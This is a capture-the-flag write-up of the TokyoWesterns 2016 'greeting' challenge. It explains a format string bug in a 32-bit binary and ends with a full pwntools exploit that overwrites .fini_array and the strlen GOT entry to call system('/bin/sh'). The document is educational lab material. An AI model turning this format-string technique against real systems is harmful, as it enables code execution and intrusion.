# Tokyowesterns 2016 greeting

Let's take a look at the binary:

```
$    file greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped
$    pwn checksec greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
[*] '/Hackery/all/tw16/greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So we are dealing with a `32` bit binary, with a stack canary and non executable stack (but no RELRO or PIE). Let's see what happens when we run the binary:

```
./greeting
Hello, I'm nao!
Please tell me your name... guyinatuxedo
Nice to meet you, guyinatuxedo :)
```


So we can see that we are prompted for input, which it prints back out to us. Let's take a look at the binary in Ghidra:
```
void main(void)

{
  int bytesRead;
  int in_GS_OFFSET;
  char printedString [64];
  undefined name [64];
  int stackCanary;
 
  stackCanary = *(int *)(in_GS_OFFSET + 0x14);
  printf("Please tell me your name... ");
  bytesRead = getnline(name,0x40);
  if (bytesRead == 0) {
    puts("Don\'t ignore me ;( ");
  }
  else {
    sprintf(printedString,"Nice to meet you, %s :)\n",name);
    printf(printedString);
  }
  if (stackCanary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see that in the `main` function, it runs the `getnline` function which scans in input and returns the amount of bytes read (I will cover that function next). It scans in data into the `name` char buffer. Proceeding that if `getnline` didn't scan in `0` bytes, it will write the string `"Nice to meet you, " + ourInput + " :)\n"` to `printedString`, then prints it using `printf`. Thing is since in the `printf` call it doesn't specify a format to print the input, this is a format string bug and we can specify how our input is printed. Using the `%n` flag with printf, we can actually write to memory. Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.

Looking at the `getnline` function, we see this:
```
void getnline(char *ptr,int bytesRead)

{
  char *pcVar1;
 
  fgets(ptr,bytesRead,stdin);
  pcVar1 = strchr(ptr,10);
  if (pcVar1 != (char *)0x0) {
    *pcVar1 = '\0';
  }
  strlen(ptr);
  return;
}
```

It just scans in `bytesRead` amount of data (in our case `0x40` or `60` so no overflow) into the space pointed to by `ptr`. Proceeding that, it will replace the newline character with a null byte. It will then return the output of `strlen` on our input.

Now the next thing we need will be a function to overwrite a got entry with. Looking through the list of imports in ghidra (imported functions are included in the compiled binary code, and since pie isn't enabled we know the addresses of those functions) we can see that `system` is imported, and is at the address `0x8048490` in the plt table:

```
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int system(char * __command)
                               Thunked-Function: <EXTERNAL>::system
             int               EAX:4          <RETURN>
             char *            Stack[0x4]:4   __command
                             system@@GLIBC_2.0
                             system                                          XREF[2]:     system:08048490(T),
                                                                                          system:08048490(c), 08049a48(*)  
        0804a014                 ??         ??

```

We can also find the address using `objdump`:
```
$    objdump -D greeting | grep system
08048490 <system@plt>:
 8048779:    e8 12 fd ff ff           call   8048490 <system@plt>
```

So we will overwrite a got entry of a function with `system` to call it. The question is now which function to overwrite? Now we run into a different problem. The only function called after the `printf` call which gives us a format string write, is `__stack_chk_fail()` which will only get called if we execute a buffer overflow which we really can't do right now. We will overcome this by writing to the `.fini_array`, which contains an array of functions which are executed sometime after main returns. We will just write to it the address which starts the setup for the `getnline` function, to essentially wrap back around. We can find the `.fini_array` using gdb while running the program:
```
gef➤  info file
Symbols from "/Hackery/all/tw16/greeting".
Native process:
    Using the running image of child process 18898.
    While running this, GDB does not access memory from...
Local exec file:
    `/Hackery/all/tw16/greeting', file type elf32-i386.
    Entry point: 0x80484f0
    0x08048134 - 0x08048147 is .interp
    0x08048148 - 0x08048168 is .note.ABI-tag
    0x08048168 - 0x0804818c is .note.gnu.build-id
    0x0804818c - 0x080481b8 is .gnu.hash
    0x080481b8 - 0x080482a8 is .dynsym
    0x080482a8 - 0x08048344 is .dynstr
    0x08048344 - 0x08048362 is .gnu.version
    0x08048364 - 0x08048394 is .gnu.version_r
    0x08048394 - 0x080483ac is .rel.dyn
    0x080483ac - 0x08048404 is .rel.plt
    0x08048404 - 0x08048427 is .init
    0x08048430 - 0x080484f0 is .plt
    0x080484f0 - 0x08048742 is .text
    0x08048742 - 0x08048780 is tomori
    0x08048780 - 0x08048794 is .fini
    0x08048794 - 0x080487fd is .rodata
    0x08048800 - 0x0804883c is .eh_frame_hdr
    0x0804883c - 0x0804892c is .eh_frame
    0x0804992c - 0x08049934 is .init_array
    0x08049934 - 0x08049938 is .fini_array
    0x08049938 - 0x0804993c is .jcr
    0x0804993c - 0x08049a24 is .dynamic
    0x08049a24 - 0x08049a28 is .got
    0x08049a28 - 0x08049a60 is .got.plt
    0x08049a60 - 0x08049a68 is .data
    0x08049a80 - 0x08049aa8 is .bss
    0xf7fd6114 - 0xf7fd6138 is .note.gnu.build-id in /lib/ld-linux.so.2
    0xf7fd6138 - 0xf7fd6214 is .hash in /lib/ld-linux.so.2
    0xf7fd6214 - 0xf7fd6314 is .gnu.hash in /lib/ld-linux.so.2
    0xf7fd6314 - 0xf7fd6554 is .dynsym in /lib/ld-linux.so.2
    0xf7fd6554 - 0xf7fd677a is .dynstr in /lib/ld-linux.so.2
    0xf7fd677a - 0xf7fd67c2 is .gnu.version in /lib/ld-linux.so.2
    0xf7fd67c4 - 0xf7fd688c is .gnu.version_d in /lib/ld-linux.so.2
    0xf7fd688c - 0xf7fd69dc is .rel.dyn in /lib/ld-linux.so.2
    0xf7fd69dc - 0xf7fd6a14 is .rel.plt in /lib/ld-linux.so.2
    0xf7fd6a20 - 0xf7fd6aa0 is .plt in /lib/ld-linux.so.2
    0xf7fd6aa0 - 0xf7fd6aa8 is .plt.got in /lib/ld-linux.so.2
    0xf7fd6ab0 - 0xf7ff17fb is .text in /lib/ld-linux.so.2
    0xf7ff1800 - 0xf7ff60a0 is .rodata in /lib/ld-linux.so.2
    0xf7ff60a0 - 0xf7ff60a1 is .stapsdt.base in /lib/ld-linux.so.2
    0xf7ff60a4 - 0xf7ff67d8 is .eh_frame_hdr in /lib/ld-linux.so.2
    0xf7ff67d8 - 0xf7ffb37c is .eh_frame in /lib/ld-linux.so.2
    0xf7ffc880 - 0xf7ffcf34 is .data.rel.ro in /lib/ld-linux.so.2
    0xf7ffcf34 - 0xf7ffcfec is .dynamic in /lib/ld-linux.so.2
    0xf7ffcfec - 0xf7ffcff4 is .got in /lib/ld-linux.so.2
    0xf7ffd000 - 0xf7ffd028 is .got.plt in /lib/ld-linux.so.2
    0xf7ffd040 - 0xf7ffd874 is .data in /lib/ld-linux.so.2
    0xf7ffd878 - 0xf7ffd938 is .bss in /lib/ld-linux.so.2
    0xf7fd40b4 - 0xf7fd40ec is .hash in system-supplied DSO at 0xf7fd4000
    0xf7fd40ec - 0xf7fd4130 is .gnu.hash in system-supplied DSO at 0xf7fd4000
    0xf7fd4130 - 0xf7fd41c0 is .dynsym in system-supplied DSO at 0xf7fd4000
    0xf7fd41c0 - 0xf7fd4255 is .dynstr in system-supplied DSO at 0xf7fd4000
    0xf7fd4256 - 0xf7fd4268 is .gnu.version in system-supplied DSO at 0xf7fd4000
    0xf7fd4268 - 0xf7fd42bc is .gnu.version_d in system-supplied DSO at 0xf7fd4000
    0xf7fd42bc - 0xf7fd434c is .dynamic in system-supplied DSO at 0xf7fd4000
    0xf7fd434c - 0xf7fd4560 is .rodata in system-supplied DSO at 0xf7fd4000
    0xf7fd4560 - 0xf7fd45c0 is .note in system-supplied DSO at 0xf7fd4000
    0xf7fd45c0 - 0xf7fd45e4 is .eh_frame_hdr in system-supplied DSO at 0xf7fd4000
    0xf7fd45e4 - 0xf7fd46f0 is .eh_frame in system-supplied DSO at 0xf7fd4000
    0xf7fd46f0 - 0xf7fd5088 is .text in system-supplied DSO at 0xf7fd4000
    0xf7fd5088 - 0xf7fd5124 is .altinstructions in system-supplied DSO at 0xf7fd4000
    0xf7fd5124 - 0xf7fd514a is .altinstr_replacement in system-supplied DSO at 0xf7fd4000
    0xf7dd7174 - 0xf7dd7198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
    0xf7dd7198 - 0xf7dd71b8 is .note.ABI-tag in /lib/i386-linux-gnu/libc.so.6
    0xf7dd71b8 - 0xf7ddb078 is .gnu.hash in /lib/i386-linux-gnu/libc.so.6
    0xf7ddb078 - 0xf7de4cc8 is .dynsym in /lib/i386-linux-gnu/libc.so.6
    0xf7de4cc8 - 0xf7deafc6 is .dynstr in /lib/i386-linux-gnu/libc.so.6
    0xf7deafc6 - 0xf7dec350 is .gnu.version in /lib/i386-linux-gnu/libc.so.6
    0xf7dec350 - 0xf7dec8b4 is .gnu.version_d in /lib/i386-linux-gnu/libc.so.6
    0xf7dec8b4 - 0xf7dec8f4 is .gnu.version_r in /lib/i386-linux-gnu/libc.so.6
    0xf7dec8f4 - 0xf7def4e4 is .rel.dyn in /lib/i386-linux-gnu/libc.so.6
    0xf7def4e4 - 0xf7def53c is .rel.plt in /lib/i386-linux-gnu/libc.so.6
    0xf7def540 - 0xf7def600 is .plt in /lib/i386-linux-gnu/libc.so.6
    0xf7def600 - 0xf7def610 is .plt.got in /lib/i386-linux-gnu/libc.so.6
    0xf7def610 - 0xf7f3c386 is .text in /lib/i386-linux-gnu/libc.so.6
    0xf7f3c390 - 0xf7f3d41b is __libc_freeres_fn in /lib/i386-linux-gnu/libc.so.6
    0xf7f3d420 - 0xf7f3d729 is __libc_thread_freeres_fn in /lib/i386-linux-gnu/libc.so.6
    0xf7f3d740 - 0xf7f5e848 is .rodata in /lib/i386-linux-gnu/libc.so.6
    0xf7f5e848 - 0xf7f5e849 is .stapsdt.base in /lib/i386-linux-gnu/libc.so.6
    0xf7f5e84c - 0xf7f5e85f is .interp in /lib/i386-linux-gnu/libc.so.6
    0xf7f5e860 - 0xf7f64dbc is .eh_frame_hdr in /lib/i386-linux-gnu/libc.so.6
    0xf7f64dbc - 0xf7fa7874 is .eh_frame in /lib/i386-linux-gnu/libc.so.6
    0xf7fa7874 - 0xf7fa7cf7 is .gcc_except_table in /lib/i386-linux-gnu/libc.so.6
    0xf7fa7cf8 - 0xf7fab410 is .hash in /lib/i386-linux-gnu/libc.so.6
    0xf7fad15c - 0xf7fad164 is .tdata in /lib/i386-linux-gnu/libc.so.6
    0xf7fad164 - 0xf7fad1b0 is .tbss in /lib/i386-linux-gnu/libc.so.6
    0xf7fad164 - 0xf7fad16c is .init_array in /lib/i386-linux-gnu/libc.so.6
    0xf7fad16c - 0xf7fad1ec is __libc_subfreeres in /lib/i386-linux-gnu/libc.so.6
    0xf7fad1ec - 0xf7fad1f0 is __libc_atexit in /lib/i386-linux-gnu/libc.so.6
    0xf7fad1f0 - 0xf7fad200 is __libc_thread_subfreeres in /lib/i386-linux-gnu/libc.so.6
    0xf7fad200 - 0xf7fad9d4 is __libc_IO_vtables in /lib/i386-linux-gnu/libc.so.6
    0xf7fad9e0 - 0xf7faed6c is .data.rel.ro in /lib/i386-linux-gnu/libc.so.6
    0xf7faed6c - 0xf7faee5c is .dynamic in /lib/i386-linux-gnu/libc.so.6
    0xf7faee5c - 0xf7faefe4 is .got in /lib/i386-linux-gnu/libc.so.6
    0xf7faf000 - 0xf7faf038 is .got.plt in /lib/i386-linux-gnu/libc.so.6
    0xf7faf040 - 0xf7fafef4 is .data in /lib/i386-linux-gnu/libc.so.6
    0xf7faff00 - 0xf7fb2a1c is .bss in /lib/i386-linux-gnu/libc.so.6
```

Through all of that we can see that the `.fini_array` is at `0x8049934`:

```
    0x08049934 - 0x08049938 is .fini_array
```

For the address we will loop back to, I choose `0x8048614`. This is the start of the setup for the `getnline` function call, and through trial and error we can see that it doesn't crash when we loop back here:

```
        0804860f e8 3c fe        CALL       printf                                           int printf(char * __format, ...)
                 ff ff
        08048614 c7 44 24        MOV        dword ptr [ESP + local_ac],0x40
                 04 40 00
                 00 00
        0804861c 8d 44 24 5c     LEA        EAX=>name,[ESP + 0x5c]
        08048620 89 04 24        MOV        dword ptr [ESP]=>local_b0,EAX
        08048623 e8 51 00        CALL       getnline                                         undefined getnline(undefined4 pa
                 00 00
```

Now brings up the question of which function's got address will we overwrite. Since the function system takes a single argument (a char pointer), ideally it would be a function that takes a single argument that is a char pointer to our input. I decided to go with the `strlen`, since in `getnline` it is called with a char pointer to our input. In addition to that, it isn't called somewhere else that would cause a crash with what we are doing. In Ghidra looking at the `.got.plt` memory region, we can see that the `got` entry is at `0x8049a54`:

```
                             PTR_strlen_08049a54                             XREF[1]:     strlen:080484c0  
        08049a54 20 a0 04 08     addr       strlen                                           = ??
```

We can also find it using `objdump`:
```
$    objdump -R greeting | grep system
08049a48 R_386_JUMP_SLOT   system@GLIBC_2.0
```

So now the last part I need to cover is actually exploiting the format string bug. I did this by hand, and it tends to get a bit grindy. The first thing we need to do is find our input in reference to the `printf` call, which we can do using the `%x` flag:

```
./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
Hello, I'm nao!
Please tell me your name... 0000111122223333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Nice to meet you, 0000111122223333.80487d0.ff8c4e3c.0.0.0.0.6563694e.206f7420.7465656d.756f7920.3030202c.31313030.32323131.33333232.252e3333.% :)
```

So we can see our input popping up `3030202c.31313030.32323131.33333232` (`1` = `0x31`, `2` = `0x32`, `0`=`0x30`). Through a bit of shifting around values, we can find that the format string `xx0000111122223333` gives us what we need.
```
./greeting
Hello, I'm nao!
Please tell me your name... xx0000111122223333.%12$x.%13$x.%14$x.%15$x
Nice to meet you, xx0000111122223333.30303030.31313131.32323232.33333333 :)
```

Now when printf writes a value, it will write the amount of bytes it has printed. So if we need to write the value `0x804`, we need to print that many bytes. Since we are writing values like `0x8048614` I choose to split it up, that way we don't need to wait several minutes for the printf call to finish. I split up each write into two seperate writes, and that is why we needed four four byte spaces, each one for a different address. For the split writes, we will first write to the lower two bytes of each address. Since the top two bytes for each of the values we are writing is the same (`0x804`) I choose to write those last.

Now when I ran the exploit below hand, these are the values that are written by default. At this point I know everything I need to write the exploit, except the extra number of bytes I need to print to write the correct values (to print `13` bytes we can just specify the format string `%13x`):

```
gef➤  x/x 0x8049934
0x8049934:    0x00240024
gef➤  x/x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x00240024
```

The first write I do is the the lower two bytes of the `.fini_array` address `0x8049934`. I need it to be the value `0x8614`, and it's value right now is `0x24`. So we just need to print an additional `0x8614 - 0x24 = 34288` bytes to get it to that value. Also the bytes printed before will affect future writes, so I just went through and did this for each individual write (except for the last two, since they were the same write I only needed to have one additional bytes printing for it). Subsequent writes can only be greater or equal to, not lesser.

When we try to write the higher two bytes, we run into a bit of an issue:

```
gef➤  x/x 0x8049934
0x8049934:    0x84908614
gef➤  x/x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x84908490
```

The value it is writing to the higher two bytes is `0x8490`, however the value we need to write is smaller than that `0x0804`. So what we can do is write a larger value to it that contains the value `0x0804`, however the higher portion of that number will end up outside of the area we are writing to it. In order to do this, we will need to print `33652` bytes:

```
>>> (0x10000 - 0x8490) + 0x804
33652
```
we can see that the value were writing overflows into other subsequent dwords, however it doesn't really affect us:

```
gef➤  x/2x 0x8049934
0x8049934:    0x08048614    0x00000002
gef➤  x/2x 0x8049a54
0x8049a54 <strlen@got.plt>:    0x08048490    0xf7d40002
```

With all of that, we can put it together and we get this exploit:
```
from pwn import *

# Establish the target process
target = process('greeting')
gdb.attach(target, gdbscript = 'b *0x0804864f')

# The values we will be overwritting
finiArray = 0x08049934
strlenGot = 0x08049a54

# The values we will be overwritting with
getline = 0x8048614
systemPlt = 0x8048490

# Establish the format string
payload = ""

# Just a bit of padding
payload += "xx"

# Address of fini array
payload += p32(finiArray)

# Address of fini array + 2
payload += p32(finiArray + 2)

# Address of got entry for strlen
payload += p32(strlenGot)

# Address of got entry for strlen + 2
payload += p32(strlenGot + 2)

# Write the lower two bytes of the fini array with loop around address (getline setup)
payload += "%34288x"
payload += "%12$n"

# Write the lower two bytes of the plt system address to the got strlen entry
payload += "%65148x"
payload += "%14$n"

# Write the higher two bytes of the two address we just wrote to
# Both are the same (0x804)
payload += "%33652x"
payload += "%13$n"
payload += "%15$n"

# Print the length of our fmt string (make sure we meet the size requirement)
print "len: " + str(len(payload))

# Send the format string
target.sendline(payload)

# Send '/bin/sh' to trigger the system('/bin/sh') call
target.sendline('/bin/sh')

# Drop to an interactive shell
target.interactive()
```

With that exploit, we get shell!